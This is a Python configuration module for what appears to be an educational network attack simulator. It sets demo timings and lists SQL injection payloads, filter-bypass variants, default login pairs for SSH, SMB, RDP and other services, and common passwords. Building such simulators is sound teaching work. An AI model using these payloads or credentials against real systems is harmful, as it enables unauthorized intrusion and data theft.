"""
config.py
=========
Central configuration for the Network Attack Simulator.
All magic numbers, credential lists, and tunable constants live here.
Import from this module instead of duplicating constants across files.

Phase 2 additions:
  - MITM_DELAY, MITM_CYCLES
  - SQLI_DELAY, SQLI_PAYLOADS, SQLI_BYPASS_PAYLOADS, SIMULATED_DB_TABLES
  - LATERAL_DELAY, LATERAL_CREDS

Fix (v2):
  - GUI_PORT changed from 8080 → 5000 to avoid port conflict with the
    file-server-01 node whose HTTP service is also mapped to 8080.
"""

# ── Network ───────────────────────────────────────────────────────────
ATTACKER_IP = "10.0.0.99"
GUI_HOST    = "127.0.0.1"
GUI_PORT    = 5000          # was 8080 — clashed with file-server-01 HTTP service

# ── Timing (seconds) — lower = faster demo ───────────────────────────
SCAN_DELAY     = 0.001   # per-port delay in port scan
BRUTE_DELAY    = 0.05    # per-attempt delay in brute force
DOS_WAVE_DELAY = 0.1     # per-wave delay in DoS attack
RECON_DELAY    = 0.05    # per-host delay in reconnaissance
MITM_DELAY     = 0.12    # per-interception-cycle delay in MITM
SQLI_DELAY     = 0.08    # per-payload delay in SQL injection
LATERAL_DELAY  = 0.10    # per-hop probe delay in lateral movement

# ── DoS defaults ──────────────────────────────────────────────────────
DOS_DEFAULT_DURATION = 5
DOS_DEFAULT_PPS      = 500

# ── MITM ─────────────────────────────────────────────────────────────
MITM_CYCLES = 8   # number of packet-capture cycles

# ── SQL Injection payloads ────────────────────────────────────────────
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "' UNION SELECT table_name FROM information_schema.tables--",
    "admin'--",
    "' OR 'a'='a",
    "1; SELECT * FROM users--",
    "' AND 1=2 UNION SELECT username,password FROM users--",
    "' AND SLEEP(5)--",
]

SQLI_BYPASS_PAYLOADS = [
    "' /*!OR*/ 1=1--",
    "%27%20OR%201=1--",
    "' OR/**/1=1--",
    "';%0aOR%0a1=1--",
]

SIMULATED_DB_TABLES = [
    "users",
    "sessions",
    "orders",
    "admin_credentials",
    "customer_data",
    "payment_info",
    "audit_log",
    "employee_records",
]

# ── Lateral Movement credentials (service → (user, password)) ─────────
LATERAL_CREDS = {
    "SSH":    ("root",          "root"),
    "SMB":    ("Administrator", "password"),
    "RDP":    ("Administrator", "P@ssw0rd"),
    "FTP":    ("anonymous",     ""),
    "MySQL":  ("root",          ""),
    "TELNET": ("admin",         "admin"),
    "HTTP":   ("admin",         "admin123"),
}

# ── Brute-force credential lists ──────────────────────────────────────
COMMON_PASSWORDS = [
    "123456", "password", "admin", "root", "letmein",
    "qwerty", "welcome", "monkey", "dragon", "master",
    "sunshine", "princess", "football", "shadow", "superman",
]

WEAK_CREDENTIALS = {
    "SSH":    ("root",          "root"),
    "FTP":    ("anonymous",     ""),
    "MySQL":  ("root",          ""),
    "TELNET": ("admin",         "admin"),
    "HTTP":   ("admin",         "admin123"),
    "SMB":    ("Administrator", "password"),
}
